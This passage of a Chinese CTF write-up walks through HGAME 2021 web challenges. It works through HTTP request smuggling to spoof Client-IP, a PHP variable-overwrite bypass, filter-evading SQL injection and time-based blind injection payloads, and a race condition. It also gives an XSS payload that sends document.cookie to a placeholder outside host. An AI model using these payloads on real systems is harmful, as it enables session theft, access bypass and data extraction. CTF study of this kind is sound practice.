+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">aa:bb</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Content-Length: 73</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<p>这样就成功伪装成<code>127.0.0.1</code>了</p>
+<h3 id="3251-当缓存命中时，清空请求体"><a href="#3251-当缓存命中时，清空请求体" class="headerlink" title="3251 当缓存命中时，清空请求体"></a><a href="https://github.com/apache/trafficserver/pull/3251" target="_blank" rel="noopener">3251 当缓存命中时，清空请求体</a></h3><p>也就是说，在未修复前，当缓存命中之后，是不会清空请求体，将请求体作为第二个请求去处理<br>像这样</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/ec33b9fb9ead01cbe04c26606fe57968.png" alt=""></p>
+<p>不过这题看起来没有开启AST的缓存功能，因此无法利用</p>
+<p>这题写得比较详细主要还是因为之前没实际做过http走私的题，就把<code>CVE-2018-8004</code>中每个利用都尝试了一下，熟练熟练</p>
+<h2 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h2><p>这题做得太窒息了，进去就是一个定积分（刚考完研已经ptsd了）</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/4cceffb7d3a2d395e24600bf77cf47ee.png" alt=""></p>
+<p>做是不可能做的，看了下源码发现就几个接口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">function getStatus()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type:&quot;GET&quot;,</span><br><span class="line">        url: &quot;/api/getStatus&quot;,</span><br><span class="line">        dataType:&quot;json&quot;,</span><br><span class="line">        success:function(data)&#123;</span><br><span class="line">            let solving = data[&apos;solving&apos;]</span><br><span class="line">            $(&quot;#status&quot;).text(solving);</span><br><span class="line">            if(solving === 100)</span><br><span class="line">                getFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getQuestion()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;GET&quot;,</span><br><span class="line">        url: &quot;/api/getQuestion&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        xhrFields: &#123;</span><br><span class="line">            withCredentials: true</span><br><span class="line">        &#125;,</span><br><span class="line">        crossDomain: true,</span><br><span class="line">        success:function(data)&#123;</span><br><span class="line">            $(&apos;#integral&apos;).html(data[&apos;question&apos;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;GET&quot;,</span><br><span class="line">        url: &quot;/api/getFlag&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        success:function(data)&#123;</span><br><span class="line">            $(&apos;#flag&apos;).html(data[&apos;flag&apos;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function init()&#123;</span><br><span class="line">    getQuestion();</span><br><span class="line">    getStatus();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function submit()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">	    type: &quot;POST&quot;,</span><br><span class="line">	    url: &quot;/api/verify&quot;,</span><br><span class="line">	    data: JSON.stringify(&#123;answer:parseFloat($(&apos;#answer&apos;).val())&#125;),</span><br><span class="line">	    dataType: &quot;json&quot;,</span><br><span class="line">	    contentType: &quot;application/json;charset=utf-8&quot;,</span><br><span class="line">	    xhrFields: &#123;</span><br><span class="line">	        withCredentials: true</span><br><span class="line">	    &#125;,</span><br><span class="line">	    crossDomain: true,</span><br><span class="line">	    success: function(data) &#123;</span><br><span class="line">	        console.log(data);</span><br><span class="line">	        if (data[&apos;result&apos;] === true) &#123;</span><br><span class="line">	            init();</span><br><span class="line">	            $(&apos;#alert&apos;).html(`</span><br><span class="line">	                &lt;div class=&quot;alert alert-success&quot;&gt;\n</span><br><span class="line">	                    &lt;strong&gt;Right!&lt;/strong&gt;\n</span><br><span class="line">	                &lt;/div&gt;`)</span><br><span class="line">	        &#125; else &#123;</span><br><span class="line">	            $(&apos;#alert&apos;).html(`</span><br><span class="line">	                &lt;div class=&quot;alert alert-danger&quot;&gt;\n</span><br><span class="line">	                    &lt;strong&gt;Wrong!&lt;/strong&gt;\n</span><br><span class="line">	                &lt;/div&gt;`)</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>于是尝试直接去访问一下，就被嘲讽了</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/883f4b830940ccf88ae700056ce465ed.png" alt=""></p>
+<p>不过看到cookie上的session值感觉是jwt，于是就尝试解一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/86b476179940b8bff1bb393cf44dfd87.png" alt=""></p>
+<p>session中保存的做题数量，想着是不是把token篡改就可以了，于是就走上了一条不归路orz</p>
+<p>不过整个尝试的过程也算学到了些东西，首先是jwt的原理，之前一直没有去认真看过<br>jwt分为三段，分别是<code>header.payload.signature</code>，都是经过base64编码后去掉尾部<code>=</code>得到的。<code>header</code>中一般存签名的加密方式，<code>payload</code>中存主要的信息，<code>signature</code>就是前面部分经过<code>hmac xxx</code>(加密方式，常用的加密是sha256)得到的数字签名，也就是<code>hmac sha256(header.payload, key)</code>，用于防止伪造<br>一开始我还以为这个<code>key</code>可以得到，猜<code>key</code>可能是<code>pyload</code>的内容，但<code>token</code>中的签名长度只有20位，<code>hmac sha256</code>加密出来的在<code>base64</code>后都是32位，就很懵逼。<code>hmac sha1</code>得到的倒是20位但一直不正确，尝试了各种密码都解不出来</p>
+<p>然后看到后台是<code>Werkzeug/1.0.1 Python/3.8.7</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/2a724d75a46b24d9158dabb3edda0722.png" alt=""></p>
+<p>搜了一下都是关于<code>flask</code>的，于是查找<code>flask jwt</code>，找到了一篇文章<br><a href="https://www.freebuf.com/articles/network/247503.html" target="_blank" rel="noopener">浅谈flask与ctf那些事</a><br>发现其中的session伪造的密钥还是需要通过SSTI去得到，但这个页面看起来没有SSTI点</p>
+<p>于是回到题目</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/48cc8a7444940127c7078fcbd32712cd.png" alt=""></p>
+<p>提示了积分全都是<code>ax+b</code>的形式，这时候我才想是不是真的要全部算一下啊？！于是就用脚本跑出来了orz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import re</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">que_url = &quot;http://r4u.top:5000/api/getQuestion&quot;</span><br><span class="line">ver_url = &quot;http://r4u.top:5000/api/verify&quot;</span><br><span class="line">cookie = &#123;&quot;session&quot;:&quot;eyJzb2x2aW5nIjowfQ.YBdmjw.XJwVbgzxQkziZiBmOLz-DaESi5M&quot;&#125;</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">	http = requests.get(que_url, cookies=cookie)</span><br><span class="line">	num = re.findall(r&quot;&lt;mn&gt;([^&lt;&gt;]+)&lt;/mn&gt;&quot;, http.content.decode())</span><br><span class="line">	sign = re.findall(r&quot;&lt;mo&gt;([^&lt;&gt;]+)&lt;/mo&gt;&quot;, http.content.decode())</span><br><span class="line">	if sign[1] != &apos;(&apos;:</span><br><span class="line">		up = int(num[1])</span><br><span class="line">		down = 0-int(num[0])</span><br><span class="line">	a = int(num[2])</span><br><span class="line">	b = int(num[3])</span><br><span class="line">	answer = ((a/2)*(up*up)+b*up)-((a/2)*(down*down)+b*down)</span><br><span class="line"></span><br><span class="line">	header = &#123;&quot;Content-Type&quot;: &quot;application/json;charset=utf-8&quot;&#125;</span><br><span class="line">	data = json.dumps(&#123;&quot;answer&quot;:answer&#125;)</span><br><span class="line">	print(data)</span><br><span class="line"></span><br><span class="line">	http = requests.post(ver_url, data=data, cookies=cookie, headers=header)</span><br><span class="line">	if &quot;true&quot; not in http.content.decode():</span><br><span class="line">		print(cookie)</span><br><span class="line">		exit()</span><br><span class="line">	cookie = &#123;&quot;session&quot;:http.cookies[&apos;session&apos;]&#125;</span><br><span class="line">	print(cookie)</span><br><span class="line">	time.sleep(1)</span><br><span class="line">print(cookie)</span><br></pre></td></tr></table></figure>
+<p>整了我一晚，没想到是道脚本题，人都傻了</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/04d7960b790f935d84eb4ca705bb79f9.png" alt=""></p>
+<p>拿最后的<code>token</code>去访问一下得到flag（假装做了100道</p>
+<h2 id="走私者的愤怒"><a href="#走私者的愤怒" class="headerlink" title="走私者的愤怒"></a>走私者的愤怒</h2><p>这题是由于之前那题太容易上车了，于是出题人改了一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/2ac00d6c8ffd1d16339253de8ce1a972.png" alt=""></p>
+<p>可以看到不需要有<code>Client-IP</code>请求字段，服务器会自动携带</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/676dc302976f3db169f4892e474b92de.png" alt=""></p>
+<p>试着用之前的方法连续访问，响应了400</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/39dd3943e58e4ccb9385f3346acc5ba7.jpg" alt=""></p>
+<p>多试好几次，好像是不允许一个请求中出现两个<code>Host</code>。我们也可以看到，由于是自动添加<code>Client-IP</code>，因此当我们连续访问时，第二条请求就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">foo:GET / HTTP/1.1</span><br><span class="line">Host: police.liki.link</span><br><span class="line">Content-Length : 47</span><br><span class="line">Client-IP: IP</span><br></pre></td></tr></table></figure>
+<p>由于新的会覆盖旧的，因此服务器依旧会获得我们的真实IP</p>
+<p>绕开这个IP获取，只需要把第二次的报文直接作为我们的请求体即可，构造一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/df4684c03c05c4d588f819a15effb894.png" alt=""></p>
+<p>在连续访问后成功得到flag，因为第二次访问时，我们的请求实际上是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1</span><br><span class="line">Host: police.liki.link</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">Content-Length: 200</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: police.liki.link</span><br><span class="line">Content-Length : 90</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">GET /secret HTTP/1.1</span><br><span class="line">Host: police.liki.link</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">Content-Length: 200</span><br></pre></td></tr></table></figure>
+<p>第二的发出的报文全都成为了请求体，因此成功伪造<code>Client-IP</code></p>
+<p>不过还是觉得就算改了题，照样还是可以上车呀</p>
+<p>#Week2</p>
+<h2 id="LazyDogR4U"><a href="#LazyDogR4U" class="headerlink" title="LazyDogR4U"></a>LazyDogR4U</h2><p>这题一开始找了一下没找到什么，于是扫一下发现了<code>www.zip</code>，于是开始分析源码<br>可以看到<code>flag.ini</code>中的密码是md5加密过的，看起来不像是能解出来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">debug = true</span><br><span class="line"></span><br><span class="line">[admin]</span><br><span class="line">username = admin</span><br><span class="line">pass_md5 = b02d455009d3cf71951ba28058b2e615</span><br><span class="line"></span><br><span class="line">[testuser]</span><br><span class="line">username = testuser</span><br><span class="line">pass_md5 = 0e114902927253523756713132279690</span><br></pre></td></tr></table></figure>
+<p>登录功能很常规，flag需要session中有<code>username</code>才能访问<br>于是就来分析与题目名有关的<code>lazy.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filter = [&quot;SESSION&quot;, &quot;SEVER&quot;, &quot;COOKIE&quot;, &quot;GLOBALS&quot;];</span><br><span class="line"></span><br><span class="line">// 直接注册所有变量，这样我就能少打字力，芜湖~</span><br><span class="line"></span><br><span class="line">foreach(array(&apos;_GET&apos;,&apos;_POST&apos;) as $_request)&#123;</span><br><span class="line">    foreach ($$_request as $_k =&gt; $_v)&#123;</span><br><span class="line">        foreach ($filter as $youBadBad)&#123;</span><br><span class="line">            $_k = str_replace($youBadBad, &apos;&apos;, $_k);</span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;$_k&#125; = $_v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 自动加载类，这样我也能少打字力，芜湖~</span><br><span class="line">function auto($class_name)&#123;</span><br><span class="line">    require_once $class_name . &quot;.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(&apos;auto&apos;);</span><br></pre></td></tr></table></figure>
+<p><code>auto()</code>用了自动转载，<code>classname</code>可以通过上面修改，但<code>flag.php</code>有验证，感觉没什么意义。主要还是上面这里的处理<br>本来想着用<code>_SESSSERVERION</code>这样去绕过过滤修改<code>session</code>，但在处理后无法成为数组，传进去也没什么意义。最后想到直接把<code>filter</code>给改了，这样就不用进入这个循环，传入数组也能保留。于是<br><code>?filter=0&amp;_SESSION[username]=admin</code><br>然后再访问<code>flag.php</code>即可</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/0ecf98f9a7ad07cc6675e2f9fae159d8.png" alt=""></p>
+<h2 id="Post-to-zuckonit"><a href="#Post-to-zuckonit" class="headerlink" title="Post to zuckonit"></a>Post to zuckonit</h2><p>经典XSS</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/ccebdaece653befd94757a2cf1d977c7.png" alt=""></p>
+<p>隔了大半年都不会打XSS了</p>
+<p>先测试一下发现<code>script</code>会被替换为<code>div</code>，有<code>iframe</code>向前匹配<code>&lt;</code>，没有出现<code>&gt;</code>闭合时就全替换为<code>&lt;div&gt;</code>，<code>svg`</code>http<code></code>base<code>需要双写绕过。有</code>on<code>时会找到最后一个</code>on`，并将字符串全部逆序，但保留最后一个on不逆序</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/7d272ceee6ad84d28747753ece936750.png" alt=""></p>
+<p>绕过也很简单，先把要用的内容逆序，然后在尾部加上<code>on</code>即可</p>
+<p>一开始没想到<code>on</code>的绕过，于是就找了各式各样的标签尝试，也真的找到了一个<code>&lt;object&gt;</code><br><code>&lt;object data=&quot;java&amp;#115;cript:alert(document.domain)&quot;&gt;&lt;/object&gt;</code><br>像这样是可以执行js的，firefox下可以，可惜bot应该是chrome的，chrome下不会自动运行</p>
+<p><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+&gt;&lt;/object&gt;</code><br>而<code>&lt;object&gt;</code>在这种形势下可以，但是会产生一个新sandbox，解码的语句放在这个sandbox中，无法取得原本的cookie</p>
+<p>在找到绕过<code>on</code>的方法后，就直接用<code>&lt;img&gt;</code>打了，构造XSS<br><code>&lt;img src=x onerror=&quot;t=new XMLHthttptpRequest;t.open(&#39;GET&#39;, &#39;hthttptp://ip?&#39;+document.cookie,!0),t.send();&quot;&gt;</code><br>然后逆序尾部加上<code>on</code><br><code>&gt;&quot;;)(dnes.t,)0!,eikooc.tnemucod+&#39;?pi//:ptptthth&#39; ,&#39;TEG&#39;(nepo.t;tseuqeRptptthtHLMX wen=t&quot;=rorreno x=crs gmi&lt;on</code><br>这里是先处理<code>on</code>然后再处理<code>http</code>的，因此逆序中还是要双写<code>http</code></p>
+<p>然后md5截断跑一波，提交</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/b105a728e154a202ba6a8a987a038002.png" alt=""></p>
+<p>放入cookie访问<code>/flag</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/0171e837b24267761f11b8ec2819cb56.png" alt=""></p>
+<h2 id="200OK"><a href="#200OK" class="headerlink" title="200OK!!"></a>200OK!!</h2><p>进入点击reload显示各种错误</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/a1e5306a287d1ee6280397d6889eef98.png" alt=""></p>
+<p>直觉在告诉我这是道SQL注入</p>
+<p>查看源码发现了<code>requests.js</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function randomNum(min, max) &#123;</span><br><span class="line">    return parseInt(Math.random() * (max - min + 1) + min, 10)</span><br><span class="line">&#125;</span><br><span class="line">function request() &#123;</span><br><span class="line">    var status = randomNum(1, 15);</span><br><span class="line">    var req = new XMLHttpRequest();</span><br><span class="line">    req.open(&quot;GET&quot;, &quot;/server.php&quot;, true);</span><br><span class="line">    req.setRequestHeader(&quot;Status&quot;, status);</span><br><span class="line">    req.onload = function () &#123;</span><br><span class="line">        if (req.readyState === req.DONE) &#123;</span><br><span class="line">            if (req.status === 200) &#123;</span><br><span class="line">                document.getElementById(&quot;status&quot;).innerText = req.responseText;</span><br><span class="line">                document.getElementById(&quot;status&quot;).style.color = &quot;red&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    req.send(null);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在头部设置了<code>Status</code>发送给后台，于是抓包尝试一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/31da2384da9a340c32442e25c048b4f2.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/f8292f5a0021b79be8bce7860fce62c7.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/d06cbd9922476102b19244c82d474eb2.png" alt=""></p>
+<p>设置不同的值不同响应，是SQL了</p>
+<p>于是尝试一下<code>0&#39;#</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/bb2c1e5610ac9ffefeea9e316dad3e70.png" alt=""></p>
+<p>没有过滤掉<code>&#39;</code>和<code>#</code>，由于出错是无响应的，于是用异或看哪些关键字被过滤了<br><code>1&#39;^(length(&#39; &#39;)=1)#</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/93de45227864c2aaa7e1695e8e293198.png" alt=""></p>
+<p>可以看到空格被过滤了，同理可以查出<code>select、from、union</code>被过滤，不过只是<code>replace()</code>双写就可以直接绕过，空格用<code>/**/</code>代替</p>
+<p>接着查看数据库名<br><code>-1&#39;ununionion/**/selselectect/**/database()#</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/397cd9b13df7a1dfb70f0ced831b785e.png" alt=""></p>
+<p>然后获取表名<br><code>-1&#39;ununionion/**/selselectect/**/table_name/**/frfromom/**/information_schema.tables/**/whewherere/**/table_schema=&#39;week2sqli&#39;/**/limit/**/1#</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/fce7af8f889bfe19e4abef7b0e5b73ab.png" alt=""></p>
+<p>但无返回的内容</p>
+<p>换一下查询的内容<br><code>-1&#39;ununionion/**/selselectect/**/1/**/frfromom/**/information_schema.tables/**/whewherere/**/table_schema=&#39;week2sqli&#39;/**/limit/**/1#</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/9fd896d8c0e3d9130128fd7601ff9993.png" alt=""></p>
+<p>是有响应的，说明我们的语句并没有问题，那就是返回的问题了。最后使用<code>hex()</code>处理返回数据成功获得</p>
+<p><code>-1&#39;ununionion/**/selselectect/**/hex(table_name)/**/frfromom/**/information_schema.tables/**/whewherere/**/table_schema=&#39;week2sqli&#39;/**/limit/**/1#</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/6d2bf22c4c50997bd2a7e2cb3331eba3.png" alt=""></p>
+<p>再去转成str就行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&apos;ununionion/**/selselectect/**/hex(column_name)/**/frfromom/**/information_schema.columns/**/whewherere/**/table_name=&apos;f1111111144444444444g&apos;/**/limit/**/1#</span><br><span class="line">-1&apos;ununionion/**/selselectect/**/hex(ffffff14gggggg)/**/frfromom/**/f1111111144444444444g/**/limit/**/1#</span><br></pre></td></tr></table></figure>
+<h2 id="Liki的生日礼物"><a href="#Liki的生日礼物" class="headerlink" title="Liki的生日礼物"></a>Liki的生日礼物</h2><p>打开这题，就感觉和去年的那道条件竞争很像</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/e1b836c8f88dce59187c6053170701b0.png" alt=""></p>
+<p>区别是去年的有购入和卖出，今年的只有购入。不过可以看到花完钱就可以买到50张了，差两张我觉得条件竞争还是可行的，于是就放到burpsuit，开100线程跑一波</p>
+<p>burpsuit的具体操作看这里<br><a href="http://shifeng-kaze.cn/index.php/archives/88/#Cosmos%E7%9A%84%E4%BA%8C%E6%89%8B%E5%B8%82%E5%9C%BA" target="_blank" rel="noopener">Cosmos的二手市场</a></p>
+<p>跑完回来一看54张，可以直接兑换flag了</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/0ae2c732282ecdba75525ea8bf1b27bd.png" alt=""></p>
+<h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="Liki-Jail"><a href="#Liki-Jail" class="headerlink" title="Liki-Jail"></a>Liki-Jail</h2><p>看到这个题目，还以为是啥提权的题。进到题目后也没有多少东西，就一个<code>login.php</code>可以交互，一脸懵逼<br>于是去抓包，看到了有两个服务器，有一个还是没见过的</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/7cff5eeca9b13a7b588f68b0de88042f.png" alt=""></p>
+<p>于是就走上了一条歪路</p>
+<p>搜了一下才知道<code>Caddy</code>是<code>Golang</code>的web服务器，默认使用<code>https协议</code>，也可以作为代理来使用。根据这些信息，就去查了各种<code>Caddy</code>的CVE，以及<code>Caddy</code>有没有http走私的问题，但都不合适这道题。于是去做了第二题，发现也用的是<code>Caddy</code>，才意识到这个只是一个代理服务器，并不是出题者专门留的洞</p>
+<p>于是就去查找有关的<code>apache/2.4.29</code>的CVE，有但感觉也不能用。最后才以瘦死的骆驼比马大的心态，试了一下sql注入，发现居然有过滤。于是就以这个方向来做</p>
+<p>通过尝试，可以测出过滤了<code>&#39; &quot; = mid ; 空格</code>。<code>=</code>用<code>&lt;&gt;regexp</code>这些都可以代替，<code>空格</code>用<code>/**/</code>，<code>mid</code>用<code>substr</code>，<code>;</code>过滤了无法堆叠。<code>&#39; &quot;</code>这两个过滤，可以设置<code>username=1\</code>这样将<code>username</code>的单引号转义，然后和<code>password</code>处的单引号闭合，剩下就随我们注了<br>响应无回显，且登录不上的响应都相同，于是使用时间盲注</p>
+<p>尝试了一下<br><code>username=1\&amp;password=or/**/if(length(database())&gt;0,sleep(6),1)#</code><br>成功延时，于是写脚本跑盲注，跑出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">库名：week3sqli</span><br><span class="line">表名：u5ers</span><br><span class="line">列名：usern@me p@ssword</span><br></pre></td></tr></table></figure>
+<p>但在最后跑内容时<br><code>username=1\&amp;password=or/**/if((select/**/length(usern@me)/**/from/**/u5ers)&gt;0,sleep(6),1)#</code><br>没有跑出内容，还以为是因为设定是维护所以是空表。尝试写读文件都不太行，查了下权限发现只有<code>USAGE</code>。想提权但感觉也没有什么路子<br>最后还是回来仔细检查了一下，尝试了<br><code>username=1\&amp;password=or/**/if((select/**/count(*)/**/from/**/u5ers)&gt;0,sleep(6),1)#</code><br>发现居然延时了，那就是表里是有信息的，但把<code>*</code>换成<code>usern@me</code>又不行</p>
+<p>于是就想是不是<code>@</code>是个特殊字符，于是放到<code>phpmyadmin</code>里看看</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/a71da0e9fb20a1030f3b00ddd6d5b5c9.png" alt=""></p>
+<p>可以看到<code>@</code>后面的部分变蓝了，查了一下才知道，<code>mysql</code>里<code>@</code>是用来标识自定义变量的。而<code>@@</code>是用来标识全局变量的</p>
+<p>于是就用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`or/**/if((select/**/length(`usern@me`)/**/from/**/u5ers)&gt;0,sleep(6),1)#`</span><br><span class="line">就没什么问题了</span><br></pre></td></tr></table></figure></p>
+<h1 id="coding-utf8"><a href="#coding-utf8" class="headerlink" title="-- coding:utf8 --"></a>-<em>- coding:utf8 -</em>-</h1><p>import requests<br>import time</p>
+<p>url = r”<a href="https://jailbreak.liki.link/login.php&quot;" target="_blank" rel="noopener">https://jailbreak.liki.link/login.php&quot;</a><br>user = “1\“</p>
